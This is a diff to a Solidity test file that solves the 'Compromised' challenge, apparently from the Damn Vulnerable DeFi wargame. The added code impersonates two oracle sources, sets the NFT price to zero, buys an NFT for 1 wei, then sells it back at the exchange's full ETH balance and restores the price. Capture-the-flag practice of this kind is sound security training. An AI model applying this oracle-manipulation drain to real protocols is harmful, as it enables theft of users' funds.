@@ -7,7 +7,7 @@ import {Exchange} from "../../../src/Contracts/compromised/Exchange.sol";
 import {TrustfulOracle} from "../../../src/Contracts/compromised/TrustfulOracle.sol";
 import {TrustfulOracleInitializer} from "../../../src/Contracts/compromised/TrustfulOracleInitializer.sol";
 import {DamnValuableNFT} from "../../../src/Contracts/DamnValuableNFT.sol";
-
+ 
 contract Compromised is Test {
     uint256 internal constant EXCHANGE_INITIAL_ETH_BALANCE = 9990e18;
     uint256 internal constant INITIAL_NFT_PRICE = 999e18;
@@ -17,9 +17,10 @@ contract Compromised is Test {
     TrustfulOracleInitializer internal trustfulOracleInitializer;
     DamnValuableNFT internal damnValuableNFT;
     address payable internal attacker;
+    address[] sources;
 
     function setUp() public {
-        address[] memory sources = new address[](3);
+        sources = new address[](3);
 
         sources[0] = 0xA73209FB1a42495120166736362A1DfA9F95A105;
         sources[1] = 0xe92401A4d3af5E446d93D11EEc806b1462b39D15;
@@ -76,6 +77,39 @@ contract Compromised is Test {
         /**
          * EXPLOIT START *
          */
+
+        // get the addresses to prank as
+        address oracle1 = sources[0];
+        address oracle2 = sources[1];
+
+        // change the price to 0
+        vm.prank(oracle1);
+        trustfulOracle.postPrice("DVNFT", 0);
+        vm.prank(oracle2);
+        trustfulOracle.postPrice("DVNFT", 0);
+
+        // buy one nft with 1 wei
+        vm.prank(attacker);
+        uint256 tokenId = exchange.buyOne{value: 1}();
+
+        // change price to the exchanges eth balance
+        uint256 newPrice = EXCHANGE_INITIAL_ETH_BALANCE;
+        vm.prank(oracle1);
+        trustfulOracle.postPrice("DVNFT", newPrice);
+        vm.prank(oracle2);
+        trustfulOracle.postPrice("DVNFT", newPrice);
+
+        // sell nft
+        vm.startPrank(attacker);
+        damnValuableNFT.approve(address(exchange), tokenId);
+        exchange.sellOne(tokenId);
+        vm.stopPrank();
+
+        //return nft price to initial price
+        vm.prank(oracle1);
+        trustfulOracle.postPrice("DVNFT", INITIAL_NFT_PRICE);
+        vm.prank(oracle2);
+        trustfulOracle.postPrice("DVNFT", INITIAL_NFT_PRICE);
 
         /**
          * EXPLOIT END *
